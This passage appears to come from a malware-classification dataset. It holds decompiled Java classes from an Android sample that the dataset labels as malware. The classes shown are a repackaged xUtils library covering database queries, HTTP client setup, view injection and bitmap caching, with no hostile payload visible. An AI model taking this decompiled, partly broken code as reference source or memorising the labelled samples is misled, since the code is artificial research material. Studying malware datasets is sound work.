}  catch (      Throwable th) {         throw new DbException(th);       }     }   finally {       IOUtils.closeQuietly(execQuery);     }   }   public List<DbModel> findDbModelAll(  DbModelSelector dbModelSelector){     if (!tableIsExist(dbModelSelector.getEntityType())) {       return null;     }     ArrayList arrayList=new ArrayList();     Cursor execQuery=execQuery(dbModelSelector.toString());     if (execQuery == null) {       return arrayList;     }     while (execQuery.moveToNext()) {       try {         try {           arrayList.add(CursorUtils.getDbModel(execQuery));         }  catch (        Throwable th) {           throw new DbException(th);         }       }   finally {         IOUtils.closeQuietly(execQuery);       }     }     return arrayList;   }   public List<DbModel> findDbModelAll(  SqlInfo sqlInfo){     DbException dbException;     ArrayList arrayList=new ArrayList();     Cursor execQuery=execQuery(sqlInfo);     if (execQuery != null) {       while (execQuery.moveToNext()) {         try {           try {             arrayList.add(CursorUtils.getDbModel(execQuery));           }   finally {           }         }   finally {           IOUtils.closeQuietly(execQuery);         }       }     }     return arrayList;   }   public DbModel findDbModelFirst(  DbModelSelector dbModelSelector){     Cursor execQuery;     DbException dbException;     DbModel dbModel=null;     if (tableIsExist(dbModelSelector.getEntityType()) && (execQuery=execQuery(dbModelSelector.limit(1).toString())) != null) {       try {         try {           if (execQuery.moveToNext()) {             dbModel=CursorUtils.getDbModel(execQuery);           }         }   finally {         }       }   finally {         IOUtils.closeQuietly(execQuery);       }     }     return dbModel;   }   public DbModel findDbModelFirst(  SqlInfo sqlInfo){     Cursor execQuery=execQuery(sqlInfo);     try {       if (execQuery != null) {         try {           if (execQuery.moveToNext()) {             return CursorUtils.getDbModel(execQuery);           }         }  catch (        Throwable th) {           throw new DbException(th);         }       }       return null;     }   finally {       IOUtils.closeQuietly(execQuery);     }   }   public <T>T findFirst(  Selector selector){     if (!tableIsExist(selector.getEntityType())) {       return null;     }     String selector2=selector.limit(1).toString();     long seq=CursorUtils.FindCacheSequence.getSeq();     this.findTempCache.setSeq(seq);     T t=(T)this.findTempCache.get(selector2);     if (t != null) {       return t;     }     Cursor execQuery=execQuery(selector2);     try {       if (execQuery == null) {         return null;       }       try {         if (!execQuery.moveToNext()) {           return null;         }         T t2=(T)CursorUtils.getEntity(this,execQuery,selector.getEntityType(),seq);         this.findTempCache.put(selector2,t2);         return t2;       }  catch (      Throwable th) {         throw new DbException(th);       }     }   finally {       IOUtils.closeQuietly(execQuery);     }   }   public <T>T findFirst(  Class<T> cls){     return (T)findFirst(Selector.from(cls));   }   public DaoConfig getDaoConfig(){     return this.daoConfig;   }   public SQLiteDatabase getDatabase(){     return this.database;   }   public void replace(  Object obj){     try {       beginTransaction();       createTableIfNotExist(obj.getClass());       execNonQuery(SqlInfoBuilder.buildReplaceSqlInfo(this,obj));       setTransactionSuccessful();     }   finally {       endTransaction();     }   }   public void replaceAll(  List<?> list){     if (list == null || list.size() == 0) {       return;     }     try {       beginTransaction();       createTableIfNotExist(list.get(0).getClass());       Iterator<?> it=list.iterator();       while (it.hasNext()) {         execNonQuery(SqlInfoBuilder.buildReplaceSqlInfo(this,it.next()));       }       setTransactionSuccessful();     }   finally {       endTransaction();     }   }   public void save(  Object obj){     try {       beginTransaction();       createTableIfNotExist(obj.getClass());       execNonQuery(SqlInfoBuilder.buildInsertSqlInfo(this,obj));       setTransactionSuccessful();     }   finally {       endTransaction();     }   }   public void saveAll(  List<?> list){     if (list == null || list.size() == 0) {       return;     }     try {       beginTransaction();       createTableIfNotExist(list.get(0).getClass());       Iterator<?> it=list.iterator();       while (it.hasNext()) {         execNonQuery(SqlInfoBuilder.buildInsertSqlInfo(this,it.next()));       }       setTransactionSuccessful();     }   finally {       endTransaction();     }   }   public boolean saveBindingId(  Object obj){     try {       beginTransaction();       createTableIfNotExist(obj.getClass());       boolean saveBindingIdWithoutTransaction=saveBindingIdWithoutTransaction(obj);       setTransactionSuccessful();       return saveBindingIdWithoutTransaction;     }   finally {       endTransaction();     }   }   public void saveBindingIdAll(  List<?> list){     if (list == null || list.size() == 0) {       return;     }     try {       beginTransaction();       createTableIfNotExist(list.get(0).getClass());       Iterator<?> it=list.iterator();       while (it.hasNext()) {         if (!saveBindingIdWithoutTransaction(it.next())) {           throw new DbException(""saveBindingId error, transaction will not commit!"");         }       }       setTransactionSuccessful();     }   finally {       endTransaction();     }   }   public void saveOrUpdate(  Object obj){     try {       beginTransaction();       createTableIfNotExist(obj.getClass());       saveOrUpdateWithoutTransaction(obj);       setTransactionSuccessful();     }   finally {       endTransaction();     }   }   public void saveOrUpdateAll(  List<?> list){     if (list == null || list.size() == 0) {       return;     }     try {       beginTransaction();       createTableIfNotExist(list.get(0).getClass());       Iterator<?> it=list.iterator();       while (it.hasNext()) {         saveOrUpdateWithoutTransaction(it.next());       }       setTransactionSuccessful();     }   finally {       endTransaction();     }   }   public boolean tableIsExist(  Class<?> cls){     Table table=Table.get(this,cls);     if (table.isCheckedDatabase()) {       return true;     }     Cursor execQuery=execQuery(""SELECT COUNT(*) AS c FROM sqlite_master WHERE type='table' AND name='"" + table.tableName + ""'"");     try {       if (execQuery != null) {         try {           if (execQuery.moveToNext() && execQuery.getInt(0) > 0) {             table.setCheckedDatabase(true);             return true;           }         }  catch (        Throwable th) {           throw new DbException(th);         }       }       return false;     }   finally {       IOUtils.closeQuietly(execQuery);     }   }   public void update(  Object obj,  WhereBuilder whereBuilder,  String... strArr){     if (tableIsExist(obj.getClass())) {       try {         beginTransaction();         execNonQuery(SqlInfoBuilder.buildUpdateSqlInfo(this,obj,whereBuilder,strArr));         setTransactionSuccessful();       }   finally {         endTransaction();       }     }   }   public void update(  Object obj,  String... strArr){     if (tableIsExist(obj.getClass())) {       try {         beginTransaction();         execNonQuery(SqlInfoBuilder.buildUpdateSqlInfo(this,obj,strArr));         setTransactionSuccessful();       }   finally {         endTransaction();       }     }   }   public void updateAll(  List<?> list,  WhereBuilder whereBuilder,  String... strArr){     if (list == null || list.size() == 0 || !tableIsExist(list.get(0).getClass())) {       return;     }     try {       beginTransaction();       Iterator<?> it=list.iterator();       while (it.hasNext()) {         execNonQuery(SqlInfoBuilder.buildUpdateSqlInfo(this,it.next(),whereBuilder,strArr));       }       setTransactionSuccessful();     }   finally {       endTransaction();     }   }   public void updateAll(  List<?> list,  String... strArr){     if (list == null || list.size() == 0 || !tableIsExist(list.get(0).getClass())) {       return;     }     try {       beginTransaction();       Iterator<?> it=list.iterator();       while (it.hasNext()) {         execNonQuery(SqlInfoBuilder.buildUpdateSqlInfo(this,it.next(),strArr));       }       setTransactionSuccessful();     }   finally {       endTransaction();     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils\FindTempCache.code","public class FindTempCache {   private final ConcurrentHashMap<String,Object> cache;   private long seq;   private FindTempCache(){     this.cache=new ConcurrentHashMap<>();     this.seq=0L;   }   public Object get(  String str){     return this.cache.get(str);   }   public void put(  String str,  Object obj){     if (str == null || obj == null) {       return;     }     this.cache.put(str,obj);   }   public void setSeq(  long j){     if (this.seq != j) {       this.cache.clear();       this.seq=j;     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils\HttpUtils.code","public class HttpUtils {   private static final int DEFAULT_CONN_TIMEOUT=15000;   private static final int DEFAULT_POOL_SIZE=3;   private static final int DEFAULT_RETRY_TIMES=3;   private static final String ENCODING_GZIP=""gzip"";   private static final String HEADER_ACCEPT_ENCODING=""Accept-Encoding"";   private long currentRequestExpiry;   private final DefaultHttpClient httpClient;   private final HttpContext httpContext;   private HttpRedirectHandler httpRedirectHandler;   private String responseTextCharset;   public static final HttpCache sHttpCache=new HttpCache();   private static final PriorityExecutor EXECUTOR=new PriorityExecutor(3);   public HttpUtils(){     this(DEFAULT_CONN_TIMEOUT,null);   }   public HttpUtils(  int i){     this(i,null);   }   public HttpUtils(  int i,  String str){     this.httpContext=new BasicHttpContext();     this.responseTextCharset=AsyncHttpResponseHandler.DEFAULT_CHARSET;     this.currentRequestExpiry=HttpCache.getDefaultExpiryTime();     BasicHttpParams basicHttpParams=new BasicHttpParams();     ConnManagerParams.setTimeout(basicHttpParams,i);     HttpConnectionParams.setSoTimeout(basicHttpParams,i);     HttpConnectionParams.setConnectionTimeout(basicHttpParams,i);     HttpProtocolParams.setUserAgent(basicHttpParams,TextUtils.isEmpty(str) ? OtherUtils.getUserAgent(null) : str);     ConnManagerParams.setMaxConnectionsPerRoute(basicHttpParams,new ConnPerRouteBean(10));     ConnManagerParams.setMaxTotalConnections(basicHttpParams,10);     HttpConnectionParams.setTcpNoDelay(basicHttpParams,true);     HttpConnectionParams.setSocketBufferSize(basicHttpParams,8192);     HttpProtocolParams.setVersion(basicHttpParams,HttpVersion.HTTP_1_1);     SchemeRegistry schemeRegistry=new SchemeRegistry();     schemeRegistry.register(new Scheme(""http"",PlainSocketFactory.getSocketFactory(),80));     schemeRegistry.register(new Scheme(""https"",DefaultSSLSocketFactory.getSocketFactory(),443));     this.httpClient=new DefaultHttpClient(new ThreadSafeClientConnManager(basicHttpParams,schemeRegistry),basicHttpParams);     this.httpClient.setHttpRequestRetryHandler(new RetryHandler(3));     this.httpClient.addRequestInterceptor(new HttpRequestInterceptor(){       @Override public void process(      HttpRequest httpRequest,      HttpContext httpContext){         if (httpRequest.containsHeader(""Accept-Encoding"")) {           return;         }         httpRequest.addHeader(""Accept-Encoding"",""gzip"");       }     } );     this.httpClient.addResponseInterceptor(new HttpResponseInterceptor(){       @Override public void process(      HttpResponse httpResponse,      HttpContext httpContext){         Header contentEncoding;         HttpEntity entity=httpResponse.getEntity();         if (entity == null || (contentEncoding=entity.getContentEncoding()) == null) {           return;         }         HeaderElement[] elements=contentEncoding.getElements();         for (        HeaderElement headerElement : elements) {           if (headerElement.getName().equalsIgnoreCase(""gzip"")) {             httpResponse.setEntity(new GZipDecompressingEntity(httpResponse.getEntity()));             return;           }         }       }     } );   }   public HttpUtils(  String str){     this(DEFAULT_CONN_TIMEOUT,str);   }   private <T>HttpHandler<T> sendRequest(  com.fw.tzthree.lidroid.xutils.http.client.HttpRequest httpRequest,  RequestParams requestParams,  RequestCallBack<T> requestCallBack){     HttpHandler<T> httpHandler=new HttpHandler<>(this.httpClient,this.httpContext,this.responseTextCharset,requestCallBack);     httpHandler.setExpiry(this.currentRequestExpiry);     httpHandler.setHttpRedirectHandler(this.httpRedirectHandler);     httpRequest.setRequestParams(requestParams,httpHandler);     if (requestParams != null) {       httpHandler.setPriority(requestParams.getPriority());     }     httpHandler.executeOnExecutor(EXECUTOR,httpRequest);     return httpHandler;   }   private ResponseStream sendSyncRequest(  com.fw.tzthree.lidroid.xutils.http.client.HttpRequest httpRequest,  RequestParams requestParams){     SyncHttpHandler syncHttpHandler=new SyncHttpHandler(this.httpClient,this.httpContext,this.responseTextCharset);     syncHttpHandler.setExpiry(this.currentRequestExpiry);     syncHttpHandler.setHttpRedirectHandler(this.httpRedirectHandler);     httpRequest.setRequestParams(requestParams);     return syncHttpHandler.sendRequest(httpRequest);   }   public HttpUtils configCookieStore(  CookieStore cookieStore){     this.httpContext.setAttribute(""http.cookie-store"",cookieStore);     return this;   }   public HttpUtils configCurrentHttpCacheExpiry(  long j){     this.currentRequestExpiry=j;     return this;   }   public HttpUtils configDefaultHttpCacheExpiry(  long j){     HttpCache.setDefaultExpiryTime(j);     this.currentRequestExpiry=HttpCache.getDefaultExpiryTime();     return this;   }   public HttpUtils configHttpCacheSize(  int i){     sHttpCache.setCacheSize(i);     return this;   }   public HttpUtils configHttpRedirectHandler(  HttpRedirectHandler httpRedirectHandler){     this.httpRedirectHandler=httpRedirectHandler;     return this;   }   public HttpUtils configRegisterScheme(  Scheme scheme){     this.httpClient.getConnectionManager().getSchemeRegistry().register(scheme);     return this;   }   public HttpUtils configRequestRetryCount(  int i){     this.httpClient.setHttpRequestRetryHandler(new RetryHandler(i));     return this;   }   public HttpUtils configRequestThreadPoolSize(  int i){     EXECUTOR.setPoolSize(i);     return this;   }   public HttpUtils configResponseTextCharset(  String str){     if (!TextUtils.isEmpty(str)) {       this.responseTextCharset=str;     }     return this;   }   public HttpUtils configSSLSocketFactory(  SSLSocketFactory sSLSocketFactory){     this.httpClient.getConnectionManager().getSchemeRegistry().register(new Scheme(""https"",sSLSocketFactory,443));     return this;   }   public HttpUtils configSoTimeout(  int i){     HttpConnectionParams.setSoTimeout(this.httpClient.getParams(),i);     return this;   }   public HttpUtils configTimeout(  int i){     HttpParams params=this.httpClient.getParams();     ConnManagerParams.setTimeout(params,i);     HttpConnectionParams.setConnectionTimeout(params,i);     return this;   }   public HttpUtils configUserAgent(  String str){     HttpProtocolParams.setUserAgent(this.httpClient.getParams(),str);     return this;   }   public HttpHandler<File> download(  HttpRequest.HttpMethod httpMethod,  String str,  String str2,  RequestParams requestParams,  RequestCallBack<File> requestCallBack){     return download(httpMethod,str,str2,requestParams,false,false,requestCallBack);   }   public HttpHandler<File> download(  HttpRequest.HttpMethod httpMethod,  String str,  String str2,  RequestParams requestParams,  boolean z,  RequestCallBack<File> requestCallBack){     return download(httpMethod,str,str2,requestParams,z,false,requestCallBack);   }   public HttpHandler<File> download(  HttpRequest.HttpMethod httpMethod,  String str,  String str2,  RequestParams requestParams,  boolean z,  boolean z2,  RequestCallBack<File> requestCallBack){     if (str == null) {       throw new IllegalArgumentException(""url may not be null"");     }     if (str2 == null) {       throw new IllegalArgumentException(""target may not be null"");     }     com.fw.tzthree.lidroid.xutils.http.client.HttpRequest httpRequest=new com.fw.tzthree.lidroid.xutils.http.client.HttpRequest(httpMethod,str);     HttpHandler<File> httpHandler=new HttpHandler<>(this.httpClient,this.httpContext,this.responseTextCharset,requestCallBack);     httpHandler.setExpiry(this.currentRequestExpiry);     httpHandler.setHttpRedirectHandler(this.httpRedirectHandler);     if (requestParams != null) {       httpRequest.setRequestParams(requestParams,httpHandler);       httpHandler.setPriority(requestParams.getPriority());     }     httpHandler.executeOnExecutor(EXECUTOR,httpRequest,str2,Boolean.valueOf(z),Boolean.valueOf(z2));     return httpHandler;   }   public HttpHandler<File> download(  String str,  String str2,  RequestParams requestParams,  RequestCallBack<File> requestCallBack){     return download(HttpRequest.HttpMethod.GET,str,str2,requestParams,false,false,requestCallBack);   }   public HttpHandler<File> download(  String str,  String str2,  RequestParams requestParams,  boolean z,  RequestCallBack<File> requestCallBack){     return download(HttpRequest.HttpMethod.GET,str,str2,requestParams,z,false,requestCallBack);   }   public HttpHandler<File> download(  String str,  String str2,  RequestParams requestParams,  boolean z,  boolean z2,  RequestCallBack<File> requestCallBack){     return download(HttpRequest.HttpMethod.GET,str,str2,requestParams,z,z2,requestCallBack);   }   public HttpHandler<File> download(  String str,  String str2,  RequestCallBack<File> requestCallBack){     return download(HttpRequest.HttpMethod.GET,str,str2,null,false,false,requestCallBack);   }   public HttpHandler<File> download(  String str,  String str2,  boolean z,  RequestCallBack<File> requestCallBack){     return download(HttpRequest.HttpMethod.GET,str,str2,null,z,false,requestCallBack);   }   public HttpHandler<File> download(  String str,  String str2,  boolean z,  boolean z2,  RequestCallBack<File> requestCallBack){     return download(HttpRequest.HttpMethod.GET,str,str2,null,z,z2,requestCallBack);   }   public HttpClient getHttpClient(){     return this.httpClient;   }   public <T>HttpHandler<T> send(  HttpRequest.HttpMethod httpMethod,  String str,  RequestParams requestParams,  RequestCallBack<T> requestCallBack){     if (str == null) {       throw new IllegalArgumentException(""url may not be null"");     }     return sendRequest(new com.fw.tzthree.lidroid.xutils.http.client.HttpRequest(httpMethod,str),requestParams,requestCallBack);   }   public <T>HttpHandler<T> send(  HttpRequest.HttpMethod httpMethod,  String str,  RequestCallBack<T> requestCallBack){     return send(httpMethod,str,null,requestCallBack);   }   public ResponseStream sendSync(  HttpRequest.HttpMethod httpMethod,  String str){     return sendSync(httpMethod,str,null);   }   public ResponseStream sendSync(  HttpRequest.HttpMethod httpMethod,  String str,  RequestParams requestParams){     if (str == null) {       throw new IllegalArgumentException(""url may not be null"");     }     return sendSyncRequest(new com.fw.tzthree.lidroid.xutils.http.client.HttpRequest(httpMethod,str),requestParams);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils\ViewUtils.code","public class ViewUtils {   private ViewUtils(){   }   public static void inject(  Activity activity){     injectObject(activity,new ViewFinder(activity));   }   public static void inject(  PreferenceActivity preferenceActivity){     injectObject(preferenceActivity,new ViewFinder(preferenceActivity));   }   public static void inject(  View view){     injectObject(view,new ViewFinder(view));   }   public static void inject(  Object obj,  Activity activity){     injectObject(obj,new ViewFinder(activity));   }   public static void inject(  Object obj,  PreferenceActivity preferenceActivity){     injectObject(obj,new ViewFinder(preferenceActivity));   }   public static void inject(  Object obj,  PreferenceGroup preferenceGroup){     injectObject(obj,new ViewFinder(preferenceGroup));   }   public static void inject(  Object obj,  View view){     injectObject(obj,new ViewFinder(view));   }   private static void injectObject(  Object obj,  ViewFinder viewFinder){     Class<?> cls=obj.getClass();     ContentView contentView=(ContentView)cls.getAnnotation(ContentView.class);     if (contentView != null) {       try {         cls.getMethod(""setContentView"",Integer.TYPE).invoke(obj,Integer.valueOf(contentView.value()));       }  catch (      Throwable th) {         LogUtils.e(th.getMessage(),th);       }     }     Field[] declaredFields=cls.getDeclaredFields();     if (declaredFields != null && declaredFields.length > 0) {       for (      Field field : declaredFields) {         ViewInject viewInject=(ViewInject)field.getAnnotation(ViewInject.class);         if (viewInject != null) {           try {             View findViewById=viewFinder.findViewById(viewInject.value(),viewInject.parentId());             if (findViewById != null) {               field.setAccessible(true);               field.set(obj,findViewById);             }           }  catch (          Throwable th2) {             LogUtils.e(th2.getMessage(),th2);           }         }  else {           ResInject resInject=(ResInject)field.getAnnotation(ResInject.class);           if (resInject != null) {             try {               Object loadRes=ResLoader.loadRes(resInject.type(),viewFinder.getContext(),resInject.id());               if (loadRes != null) {                 field.setAccessible(true);                 field.set(obj,loadRes);               }             }  catch (            Throwable th3) {               LogUtils.e(th3.getMessage(),th3);             }           }  else {             PreferenceInject preferenceInject=(PreferenceInject)field.getAnnotation(PreferenceInject.class);             if (preferenceInject != null) {               try {                 Preference findPreference=viewFinder.findPreference(preferenceInject.value());                 if (findPreference != null) {                   field.setAccessible(true);                   field.set(obj,findPreference);                 }               }  catch (              Throwable th4) {                 LogUtils.e(th4.getMessage(),th4);               }             }           }         }       }     }     Method[] declaredMethods=cls.getDeclaredMethods();     if (declaredMethods == null || declaredMethods.length <= 0) {       return;     }     for (    Method method : declaredMethods) {       Annotation[] declaredAnnotations=method.getDeclaredAnnotations();       if (declaredAnnotations != null && declaredAnnotations.length > 0) {         for (        Annotation annotation : declaredAnnotations) {           Class<? extends Annotation> annotationType=annotation.annotationType();           if (annotationType.getAnnotation(EventBase.class) != null) {             method.setAccessible(true);             try {               Method declaredMethod=annotationType.getDeclaredMethod(""value"",new Class[0]);               Method method2=null;               try {                 method2=annotationType.getDeclaredMethod(""parentId"",new Class[0]);               }  catch (              Throwable th5) {               }               Object invoke=declaredMethod.invoke(annotation,new Object[0]);               Object invoke2=method2 == null ? null : method2.invoke(annotation,new Object[0]);               int length=invoke2 == null ? 0 : Array.getLength(invoke2);               int length2=Array.getLength(invoke);               int i=0;               while (i < length2) {                 ViewInjectInfo viewInjectInfo=new ViewInjectInfo();                 viewInjectInfo.value=Array.get(invoke,i);                 viewInjectInfo.parentId=length > i ? ((Integer)Array.get(invoke2,i)).intValue() : 0;                 EventListenerManager.addEventMethod(viewFinder,viewInjectInfo,annotation,obj,method);                 i++;               }             }  catch (            Throwable th6) {               LogUtils.e(th6.getMessage(),th6);             }           }         }       }     }   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.bitmap\BitmapCacheListener.code","public interface BitmapCacheListener {   void onClearCacheFinished();   void onClearCacheFinished(  String str);   void onClearDiskCacheFinished();   void onClearDiskCacheFinished(  String str);   void onClearMemoryCacheFinished();   void onClearMemoryCacheFinished(  String str);   void onCloseCacheFinished();   void onFlushCacheFinished();   void onInitDiskFinished();   void onInitMemoryCacheFinished(); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.bitmap\BitmapCacheManagementTask.code","public class BitmapCacheManagementTask extends PriorityAsyncTask<Object,Void,Object[]> {   public static final int MESSAGE_CLEAR=4;   public static final int MESSAGE_CLEAR_BY_KEY=7;   public static final int MESSAGE_CLEAR_DISK=6;   public static final int MESSAGE_CLEAR_DISK_BY_KEY=9;   public static final int MESSAGE_CLEAR_MEMORY=5;   public static final int MESSAGE_CLEAR_MEMORY_BY_KEY=8;   public static final int MESSAGE_CLOSE=3;   public static final int MESSAGE_FLUSH=2;   public static final int MESSAGE_INIT_DISK_CACHE=1;   public static final int MESSAGE_INIT_MEMORY_CACHE=0;   private BitmapCacheManagementTask(){     setPriority(Priority.UI_TOP);   }   @Override public Object[] doInBackground(  Object... objArr){     BitmapCache bitmapCache;     if (objArr != null && objArr.length != 0 && (bitmapCache=BitmapGlobalConfig.this.getBitmapCache()) != null) {       try { switch (((Integer)objArr[0]).intValue()) { case 0:           bitmapCache.initMemoryCache();         break; case 1:       bitmapCache.initDiskCache();     break; case 2:   bitmapCache.flush(); break; case 3: bitmapCache.clearMemoryCache(); bitmapCache.close(); break; case 4: bitmapCache.clearCache(); break; case 5: bitmapCache.clearMemoryCache(); break; case 6: bitmapCache.clearDiskCache(); break; case 7: if (objArr.length == 2) { bitmapCache.clearCache(String.valueOf(objArr[1])); break; } break; case 8: if (objArr.length == 2) { bitmapCache.clearMemoryCache(String.valueOf(objArr[1])); break; } break; case 9: if (objArr.length == 2) { bitmapCache.clearDiskCache(String.valueOf(objArr[1])); break; } break; } }  catch (Throwable th) { LogUtils.e(th.getMessage(),th); } } return objArr; } @Override public void onPostExecute(Object[] objArr){ if (BitmapGlobalConfig.this.bitmapCacheListener == null || objArr == null || objArr.length == 0) { return; } try { switch (((Integer)objArr[0]).intValue()) { case 0: BitmapGlobalConfig.this.bitmapCacheListener.onInitMemoryCacheFinished(); break; case 1: BitmapGlobalConfig.this.bitmapCacheListener.onInitDiskFinished(); break; case 2: BitmapGlobalConfig.this.bitmapCacheListener.onFlushCacheFinished(); break; case 3: BitmapGlobalConfig.this.bitmapCacheListener.onCloseCacheFinished(); break; case 4: BitmapGlobalConfig.this.bitmapCacheListener.onClearCacheFinished(); break; case 5: BitmapGlobalConfig.this.bitmapCacheListener.onClearMemoryCacheFinished(); break; case 6: BitmapGlobalConfig.this.bitmapCacheListener.onClearDiskCacheFinished(); break; case 7: if (objArr.length == 2) { BitmapGlobalConfig.this.bitmapCacheListener.onClearCacheFinished(String.valueOf(objArr[1])); break; } break; case 8: if (objArr.length == 2) { BitmapGlobalConfig.this.bitmapCacheListener.onClearMemoryCacheFinished(String.valueOf(objArr[1])); break; } break; case 9: if (objArr.length == 2) { BitmapGlobalConfig.this.bitmapCacheListener.onClearDiskCacheFinished(String.valueOf(objArr[1])); break; } break; } }  catch (Throwable th) { LogUtils.e(th.getMessage(),th); } } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.bitmap\BitmapCommonUtils.code","public class BitmapCommonUtils {   private static BitmapSize screenSize=null;   private BitmapCommonUtils(){   }   private static int getImageViewFieldValue(  Object obj,  String str){     if (!(obj instanceof ImageView)) {       return 0;     }     try {       Field declaredField=ImageView.class.getDeclaredField(str);       declaredField.setAccessible(true);       int intValue=((Integer)declaredField.get(obj)).intValue();       if (intValue <= 0 || intValue >= Integer.MAX_VALUE) {         intValue=0;       }       return intValue;     }  catch (    Throwable th) {       return 0;     }   }   public static BitmapSize getScreenSize(  Context context){     if (screenSize == null) {       DisplayMetrics displayMetrics=context.getResources().getDisplayMetrics();       screenSize=new BitmapSize(displayMetrics.widthPixels,displayMetrics.heightPixels);     }     return screenSize;   }   public static com.fw.tzthree.lidroid.xutils.bitmap.core.BitmapSize optimizeMaxSizeByView(  android.view.View r4,  int r5,  int r6){     throw new UnsupportedOperationException(""Method not decompiled: com.fw.tzthree.lidroid.xutils.bitmap.BitmapCommonUtils.optimizeMaxSizeByView(android.view.View, int, int):com.fw.tzthree.lidroid.xutils.bitmap.core.BitmapSize"");   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.bitmap\BitmapDisplayConfig.code","public class BitmapDisplayConfig {   private Animation animation;   private BitmapFactory bitmapFactory;   private BitmapSize bitmapMaxSize;   private Drawable loadFailedDrawable;   private Drawable loadingDrawable;   private Priority priority;   private boolean autoRotation=false;   private boolean showOriginal=false;   private Bitmap.Config bitmapConfig=Bitmap.Config.RGB_565;   public BitmapDisplayConfig cloneNew(){     BitmapDisplayConfig bitmapDisplayConfig=new BitmapDisplayConfig();     bitmapDisplayConfig.bitmapMaxSize=this.bitmapMaxSize;     bitmapDisplayConfig.animation=this.animation;     bitmapDisplayConfig.loadingDrawable=this.loadingDrawable;     bitmapDisplayConfig.loadFailedDrawable=this.loadFailedDrawable;     bitmapDisplayConfig.autoRotation=this.autoRotation;     bitmapDisplayConfig.showOriginal=this.showOriginal;     bitmapDisplayConfig.bitmapConfig=this.bitmapConfig;     bitmapDisplayConfig.bitmapFactory=this.bitmapFactory;     bitmapDisplayConfig.priority=this.priority;     return bitmapDisplayConfig;   }   public Animation getAnimation(){     return this.animation;   }   public Bitmap.Config getBitmapConfig(){     return this.bitmapConfig;   }   public BitmapFactory getBitmapFactory(){     return this.bitmapFactory;   }   public BitmapSize getBitmapMaxSize(){     return this.bitmapMaxSize == null ? BitmapSize.ZERO : this.bitmapMaxSize;   }   public Drawable getLoadFailedDrawable(){     return this.loadFailedDrawable;   }   public Drawable getLoadingDrawable(){     return this.loadingDrawable;   }   public Priority getPriority(){     return this.priority;   }   public boolean isAutoRotation(){     return this.autoRotation;   }   public boolean isShowOriginal(){     return this.showOriginal;   }   public void setAnimation(  Animation animation){     this.animation=animation;   }   public void setAutoRotation(  boolean z){     this.autoRotation=z;   }   public void setBitmapConfig(  Bitmap.Config config){     this.bitmapConfig=config;   }   public void setBitmapFactory(  BitmapFactory bitmapFactory){     this.bitmapFactory=bitmapFactory;   }   public void setBitmapMaxSize(  BitmapSize bitmapSize){     this.bitmapMaxSize=bitmapSize;   }   public void setLoadFailedDrawable(  Drawable drawable){     this.loadFailedDrawable=drawable;   }   public void setLoadingDrawable(  Drawable drawable){     this.loadingDrawable=drawable;   }   public void setPriority(  Priority priority){     this.priority=priority;   }   public void setShowOriginal(  boolean z){     this.showOriginal=z;   }   public String toString(){     return (isShowOriginal() ? """" : this.bitmapMaxSize.toString()) + (this.bitmapFactory == null ? """" : this.bitmapFactory.getClass().getName());   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.lidroid.xutils.bitmap\BitmapGlobalConfig.code","public class BitmapGlobalConfig {   private static final int DEFAULT_POOL_SIZE=5;   public static final int MIN_DISK_CACHE_SIZE=10485760;   public static final int MIN_MEMORY_CACHE_SIZE=2097152;   private BitmapCache bitmapCache;   private BitmapCacheListener bitmapCacheListener;   private String diskCachePath;   private Downloader downloader;   private FileNameGenerator fileNameGenerator;   private Context mContext;   private static final PriorityExecutor BITMAP_LOAD_EXECUTOR=new PriorityExecutor(5);   private static final PriorityExecutor DISK_CACHE_EXECUTOR=new PriorityExecutor(2);   private static final HashMap<String,BitmapGlobalConfig> configMap=new HashMap<>(1);   private int memoryCacheSize=4194304;   private int diskCacheSize=52428800;   private boolean memoryCacheEnabled=true;   private boolean diskCacheEnabled=true;   private long defaultCacheExpiry=2592000000L;   private int defaultConnectTimeout=15000;   private int defaultReadTimeout=15000; public class BitmapCacheManagementTask extends PriorityAsyncTask<Object,Void,Object[]> {     public static final int MESSAGE_CLEAR=4;     public static final int MESSAGE_CLEAR_BY_KEY=7;     public static final int MESSAGE_CLEAR_DISK=6;     public static final int MESSAGE_CLEAR_DISK_BY_KEY=9;     public static final int MESSAGE_CLEAR_MEMORY=5;     public static final int MESSAGE_CLEAR_MEMORY_BY_KEY=8;     public static final int MESSAGE_CLOSE=3;     public static final int MESSAGE_FLUSH=2;     public static final int MESSAGE_INIT_DISK_CACHE=1;     public static final int MESSAGE_INIT_MEMORY_CACHE=0;     private BitmapCacheManagementTask(){       setPriority(Priority.UI_TOP);     }     @Override public Object[] doInBackground(    Object... objArr){       BitmapCache bitmapCache;       if (objArr != null && objArr.length != 0 && (bitmapCache=BitmapGlobalConfig.this.getBitmapCache()) != null) {         try { switch (((Integer)objArr[0]).intValue()) { case 0:             bitmapCache.initMemoryCache();           break; case 1:         bitmapCache.initDiskCache();       break; case 2:     bitmapCache.flush();   break; case 3: bitmapCache.clearMemoryCache(); bitmapCache.close(); break; case 4: bitmapCache.clearCache(); break; case 5: bitmapCache.clearMemoryCache(); break; case 6: bitmapCache.clearDiskCache(); break; case 7: if (objArr.length == 2) { bitmapCache.clearCache(String.valueOf(objArr[1])); break; } break; case 8: if (objArr.length == 2) { bitmapCache.clearMemoryCache(String.valueOf(objArr[1])); break; } break; case 9: if (objArr.length == 2) { bitmapCache.clearDiskCache(String.valueOf(objArr[1])); break; } break; } }  catch (Throwable th) { LogUtils.e(th.getMessage(),th); } 